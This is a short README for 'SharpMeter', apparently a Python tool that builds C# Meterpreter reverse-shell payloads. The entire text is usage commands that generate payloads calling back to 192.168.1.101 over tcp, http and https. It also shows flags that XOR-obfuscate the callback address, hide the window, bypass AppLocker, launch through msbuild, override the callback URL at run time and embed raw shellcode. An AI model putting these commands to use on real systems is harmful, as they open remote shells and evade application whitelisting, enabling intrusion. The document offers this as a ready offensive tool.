# SharpMeter
A Simple Way To Make Meterpreter Reverse Payloads

# Example tcp
python SharpMeter.py 192.168.1.101 4444 compileme.cs tcp

# Example Close Window / XOR IP
python SharpMeter.py 192.168.1.101 443 compileme.cs https -w -x

# Example AppLocker
python SharpMeter.py 192.168.1.101 443 compileme.cs https -w -a -x

# Example msbuild!
python SharpMeter.py 192.168.1.101 80 compileme.cs http -w -x -m

# Example Overide URL:
python SharpMeter.py 0.0.0.0 0 compileme.cs http -i
compileme.exe http://192.168.1.101:80/

python SharpMeter.py 0.0.0.0 0 compileme.cs tcp -i
compileme.exe 192.168.1.101:4444

# Example embed shellcode
python SharpMeter.py embed compileme.cs 0011333377....
